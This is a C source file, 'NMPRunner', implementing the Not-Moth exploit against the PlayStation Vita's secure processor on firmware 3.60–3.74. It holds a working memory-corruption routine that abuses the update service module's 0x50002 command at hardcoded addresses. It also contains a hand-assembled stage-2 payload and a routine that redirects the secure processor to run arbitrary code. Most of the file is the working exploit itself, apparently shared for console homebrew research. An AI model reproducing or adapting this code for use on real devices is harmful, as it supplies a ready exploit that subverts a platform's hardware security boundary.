/*
    NMPRunner by SKGleba
    This software may be modified and distributed under the terms of the MIT license.
    See the LICENSE file for details.
*/

#define NMPCORRUPT_RANGE(first, last) do { for (int i = first; i < (last + 4); i-=-4) NMPcorrupt(i); } while (0)

typedef struct NMPaddrPair {
    uint32_t addr;
    uint32_t length;
} NMPaddrPair;

typedef struct NMPaddrPairList {
    uint32_t size;
    uint32_t list_size;
    uint32_t ret_length;
    uint32_t ret_count;
    NMPaddrPair* list;
} NMPaddrPairList;

typedef struct NMPcmd_0x50002 {
    uint32_t unused_0[2];
    uint32_t use_lv2_mode_0;
    uint32_t use_lv2_mode_1;
    uint32_t unused_10[3];
    uint32_t list_count; // must be < 0x1F1
    uint32_t unused_20[4];
    uint32_t total_count; // only used in LV1 mode
    uint32_t unused_34[1];
    NMPaddrPair list[0x1F1]; // lv1 or lv2 list
} __attribute__((packed)) NMPcmd_0x50002;

typedef struct NMPheap_hdr {
    uint32_t data;
    uint32_t size;
    uint32_t size_aligned;
    uint32_t padding;
    uint32_t prev_pa;
    uint32_t next_pa;
} __attribute__((packed)) NMPheap_hdr;

typedef struct NMPSceSblSmCommContext130 {
    uint32_t unk_0;
    uint32_t self_type; // 2 - user = 1 / kernel = 0
    uint8_t data0[0x90]; //hardcoded data
    uint8_t data1[0x90];
    uint32_t pathId; // 2 (2 = os0)
    uint32_t unk_12C;
} NMPSceSblSmCommContext130;

static const unsigned char NMPctx_130_data[0x90] =
{
  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x28, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
  0xc0, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
  0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x09,
  0x80, 0x03, 0x00, 0x00, 0xc3, 0x00, 0x00, 0x00, 0x80, 0x09,
  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};

int NMPctx = -1, NMPbuid = -1, NMPcuid = -1;
uint32_t NMPcpybuf[16];
static NMPSceSblSmCommContext130 NMPsmcomm_ctx;
static NMPcmd_0x50002 NMPcargs;
static void* NMPcorridor = NULL, * NMPcached_sm = NULL;
static uint32_t NMPis_ussm_cached = 0;
uint32_t NMPcorridor_size = 0xF0000;
uint32_t NMPcorridor_paddr = 0;

NMPaddrPair NMPvrange;
NMPaddrPair NMPpairs[8];

/*
    Stage 2 payload for Not-Moth:
     - execute code @0x1C010100
     - clean r0
     - jmp back to update_sm's 0xd0002
    On 3.60 - 3.70 byte[14] = 0x26
    On 3.71 - 3.74 byte[14] = 0x8c
*/
static uint8_t NMPstage2_payload[] =
{
    0x21, 0xc0, 0x01, 0x1c,	// movh r0, 0x1C01
    0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
    0x0f, 0x10,				// jsr r0
    0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
    0x26, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd26	(0x80bd8c on .71)
    0x3e, 0x10				// jmp r3
};


/*
    configure_stage2(fw)
    Configure stage2 default payload
    ARG 1 (int):
        - current firmware
    RET (int):
        - 0: ok
        - 1: unsupported fw
*/
static int NMPconfigure_stage2(int fw) {
    if (fw >= 0x03600000 && fw < 0x03710000) {
        NMPstage2_payload[14] = 0x26;
    } else if (fw >= 0x03710000 && fw < 0x03750000) {
        NMPstage2_payload[14] = 0x8c;
    } else
        return 1;
    *(uint16_t*)(NMPstage2_payload + 2) = (uint16_t)(NMPcorridor_paddr / 0x10000);
    return 0;
}

/*
    reserve_commem(smset)
    Reserve comm area
    ARG 1 (int):
        - do memset? (0/1)
    RET (int):
        - 0: ok
        - 1: commem already reserved
        - 2: could not get paddr list
        - 3: could not alloc
*/
int NMPreserve_commem(int smset, int usepaddr) {
    int ret = 0;
    if (NMPbuid != -1)
        return 1;
    
    NMPcorridor = NULL;
    
    SceKernelAllocMemBlockKernelOpt optp;
    memset(&optp, 0, 0x58);
    optp.size = 0x58;
    optp.attr = 2;
    optp.paddr = NMPcorridor_paddr;
    NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, NMPcorridor_size, usepaddr ? &optp : NULL);
    ksceKernelGetMemBlockBase(NMPbuid, (void**)&NMPcorridor);
    if (!NMPcorridor)
        return 3;
    if (!usepaddr) {
        NMPaddrPairList paddr_list;
        NMPvrange.addr = (uint32_t)NMPcorridor;
        NMPvrange.length = NMPcorridor_size;
        paddr_list.size = 0x14;
        paddr_list.list = &NMPpairs[0];
        paddr_list.list_size = 8;
        ret = ksceKernelGetPaddrList(&NMPvrange, &paddr_list);
        if (ret < 0)
            return 2;
        NMPcorridor_paddr = NMPpairs[0].addr;
    }

    if (smset)
        memset(NMPcorridor, 0, NMPcorridor_size);
    return 0;
}

/*
    free_commem(smset)
    Free comm area
    ARG 1 (int):
        - do memset? (0/1)
    RET (int):
        - 0: ok
        - 1: commem already freed
*/
int NMPfree_commem(int smset) {
    if (NMPbuid == -1)
        return 1;
    if (smset)
        memset(NMPcorridor, 0, NMPcorridor_size);
    ksceKernelFreeMemBlock(NMPbuid);
    NMPbuid = -1;
    NMPcorridor = NULL;
    return 0;
}

/*
    copy(pbuf, off, psz, opmode)
    Copy from/to commem
    ARG 1 (void *):
        - in/out buffer
    ARG 2 (uint32_t):
        - commem offset to copy from/to
    ARG 3 (uint32_t)
        - copy size
    ARG 4 (int)
        - opmode = 0 => copy TO commem
        - opmode = 1 => copy FROM commem
    RET (int):
        - 0: ok
        - 1: commem freed
        - 2: OOB
*/
int NMPcopy(void* pbuf, uint32_t off, uint32_t psz, int opmode) {
    if (NMPbuid == -1)
        return 1;
    if ((NMPcorridor_paddr + off + psz) > (NMPcorridor_paddr + NMPcorridor_size))
        return 2;
    if (!opmode)
        memcpy((NMPcorridor + off), pbuf, psz);
    else
        memcpy(pbuf, (NMPcorridor + off), psz);

    return 0;
}

/*
    file_op(file, off, psz, opmode)
    Read from file to commem/Write to file from commem
    ARG 1 (char *):
        - file location
    ARG 2 (uint32_t):
        - commem offset to copy from/to
    ARG 3 (uint32_t)
        - copy size
    ARG 4 (int)
        - opmode = 0 => write TO file
        - opmode = 1 => read FROM file
    RET (int):
        - 0: ok
        - 1: commem freed
        - 2: OOB
        - 3: could not open
*/
int NMPfile_op(const char* floc, uint32_t off, uint32_t dsz, int opmode) {
    int fd = -1;
    if (NMPbuid == -1)
        return 1;
    if ((NMPcorridor_paddr + off + dsz) > (NMPcorridor_paddr + NMPcorridor_size))
        return 2;
    if (!opmode) {
        fd = ksceIoOpen(floc, SCE_O_WRONLY | SCE_O_TRUNC | SCE_O_CREAT, 6);
        if (fd < 0)
            return 3;
        ksceIoWrite(fd, (NMPcorridor + off), dsz);
        ksceIoClose(fd);
    } else {
        fd = ksceIoOpen(floc, SCE_O_RDONLY, 0);
        if (fd < 0)
            return 3;
        ksceIoRead(fd, (NMPcorridor + off), dsz);
        ksceIoClose(fd);
    }

    return 0;
}

/*
    corrupt(addr)
    Writes (uint32_t)0x2000 to (p)addr.
    ARG 1 (uint32_t):
        - paddr to write to
    RET (int):
        - 0: ok
*/
int NMPcorrupt(uint32_t addr) {
    int ret = 0, sm_ret = 0;
    memset(&NMPcargs, 0, sizeof(NMPcargs));
    NMPcargs.use_lv2_mode_0 = 0;
    NMPcargs.use_lv2_mode_1 = 0;
    NMPcargs.list_count = 3;
    NMPcargs.total_count = 1;
    NMPcargs.list[0].addr = 0x50000000;
    NMPcargs.list[1].addr = 0x50000000;
    NMPcargs.list[0].length = 0x10;
    NMPcargs.list[1].length = 0x10;
    NMPcargs.list[2].addr = 0;
    NMPcargs.list[2].length = addr - offsetof(NMPheap_hdr, next_pa);
    ret = ksceSblSmCommCallFunc(NMPctx, 0x50002, &sm_ret, &NMPcargs, sizeof(NMPcargs));
    if (sm_ret < 0)
        return sm_ret;
    return ret;
}


extern int ksceSblSmCommStartSmFromData(int priority, const char* elf_data, int elf_size, int num1, NMPSceSblSmCommContext130* ctx, int* id);
extern int ksceSblSmCommStartSmFromFile(int priority, const char* elf_path, int num1, NMPSceSblSmCommContext130* ctx, int* id);
/*
    exploit_init(fw)
    Converts update_sm's 0xd0002 function.
    ARG 1 (int):
        - current firmware version
    RET (int):
        - 0: ok
        - 1: error getting modinfo
        - 2: error loading sm
        - 3: unsupported fw
*/
int NMPexploit_init(int fw) {
    int ret = -1;
    NMPctx = -1;
    memset(&NMPsmcomm_ctx, 0, sizeof(NMPsmcomm_ctx));
    memcpy(NMPsmcomm_ctx.data0, NMPctx_130_data, 0x90);
    NMPsmcomm_ctx.pathId = 2;
    NMPsmcomm_ctx.self_type = (NMPsmcomm_ctx.self_type & 0xFFFFFFF0) | 2;
    if (!NMPis_ussm_cached)
        ret = ksceSblSmCommStartSmFromFile(0, "os0:sm/update_service_sm.self", 0, &NMPsmcomm_ctx, &NMPctx);
    else
        ret = ksceSblSmCommStartSmFromData(0, NMPcached_sm, NMPis_ussm_cached, 0, &NMPsmcomm_ctx, &NMPctx);
    if (ret == 0) {
        if (fw >= 0x03600000 && fw < 0x03710000) {
            NMPCORRUPT_RANGE(0x0080bd10, 0x0080bd20);
        } else if (fw >= 0x03710000 && fw < 0x03750000)
            NMPcorrupt(0x0080bd7c);
        else
            return 3;
    } else
        return 2;
    return 0;
}

/*
    f00d_jump(paddr, fw)
    Makes f00d jump to paddr, assuming that 0xd0002 is converted.
    ARG 1 (uint32_t):
        - paddr to jump to
    ARG 2 (int):
        - current firmware version
    RET (int):
        - 0: ok
        - 1: payload execute error
        - 2: payload paddr plant error
*/
static int NMPf00d_jump(uint32_t paddr, int fw) {
    int ret = -1, sm_ret = -1;
    uint32_t jpaddr = paddr;
    if (fw >= 0x03710000 && fw < 0x03750000) { // plant our payload paddr, workaround due to alignment
        memset(NMPcpybuf, 0, sizeof(NMPcpybuf));
        NMPcpybuf[0] = 1;
        NMPcpybuf[1] = 1;
        NMPcpybuf[2] = paddr;
        NMPcpybuf[3] = paddr;
        NMPcpybuf[4] = paddr;
        ret = ksceSblSmCommCallFunc(NMPctx, 0xd0002, &sm_ret, &NMPcpybuf, sizeof(NMPcpybuf));
        if (ret)
            return 2;
        jpaddr = 5414;
    }
    sm_ret = -1;
    memset(NMPcpybuf, 0, sizeof(NMPcpybuf));
    NMPcpybuf[0] = jpaddr;
    ret = ksceSblSmCommCallFunc(NMPctx, 0xd0002, &sm_ret, NMPcpybuf, sizeof(NMPcpybuf));
    if (ret)
        return 1;
    return 0;
}

/*
    run_default(pbuf, psz)
    Run the payload with default settings
    ARG 1 (void *):
        - payload buf
    ARG 2 (uint32_t):
        - payload sz
    RET (int):
        - 0x00: ok
        - 0x0X: exploit failed
        - 0x1X: commem already reserved
        - 0x2X: copy stage2 error
        - 0x3X: copy main error
        - 0x4X: payload execute error
        - 0x5X: commem already free
        - 0x6X: unsupported firmware for stage2
*/
int NMPrun_default(void* pbuf, uint32_t psz) {
    int ret = 0;
    int sysroot = ksceSysrootGetSysroot();
    uint32_t fw = *(uint32_t*)(*(int*)(sysroot + 0x6c) + 4);
    NMPctx = -1;
    ret = NMPexploit_init(fw);
    if (ret)
        return ret;
    ret = NMPconfigure_stage2(fw);
    if (ret)
        return (0x60 + ret);
    ret = NMPreserve_commem(1, 1);
    if (ret)
        return (0x10 + ret);
    ret = NMPcopy(&NMPstage2_payload, 0, sizeof(NMPstage2_payload), 0);
    if (ret)
        return (0x20 + ret);
    ret = NMPcopy(pbuf, 0x100, psz, 0);
    if (ret)
        return (0x30 + ret);
    ret = NMPfree_commem(0);
    if (ret)
        return (0x50 + ret);
    ret = NMPf00d_jump(NMPcorridor_paddr, fw);
    if (ret)
        return (0x40 + ret);
    uint32_t stop_res[2];
    stop_res[0] = 0;
    stop_res[1] = 0;
    ksceSblSmCommStopSm(NMPctx, &stop_res);
    return 0;
}

/*
    NMPcache_ussm(sm_path, cache)
    Copies the update sm to memblock
    ARG 1 (char *):
        - sm path
    ARG 2 (int):
        - read? (1: cache, 0: free)
    RET (int):
        - 0: ok
        - 2: cmd error
        - 3: file error
        - 4: could not alloc
*/
int NMPcache_ussm(const char* smsrc, int cache) {
    int fd = -1;
    if (cache && !NMPis_ussm_cached) {
        NMPcached_sm = NULL;
        NMPcuid = ksceKernelAllocMemBlock("cached_ussm", 0x1020D006, 0xc000, NULL);
        ksceKernelGetMemBlockBase(NMPcuid, (void**)&NMPcached_sm);
        if (!NMPcached_sm)
            return 4;
        SceIoStat stat;
        int stat_ret = ksceIoGetstat(smsrc, &stat);
        if (stat_ret < 0) {
            ksceKernelFreeMemBlock(NMPcuid);
            return 3;
        } else {
            fd = ksceIoOpen(smsrc, SCE_O_RDONLY, 0);
            if (fd < 0) {
                ksceKernelFreeMemBlock(NMPcuid);
                return 3;
            }
            ksceIoRead(fd, NMPcached_sm, stat.st_size);
            ksceIoClose(fd);
        }
        NMPis_ussm_cached = stat.st_size;
    } else if (!cache && NMPis_ussm_cached) {
        ksceKernelFreeMemBlock(NMPcuid);
        NMPis_ussm_cached = 0;
        NMPcached_sm = NULL;
    } else
        return 2;
    return 0;
}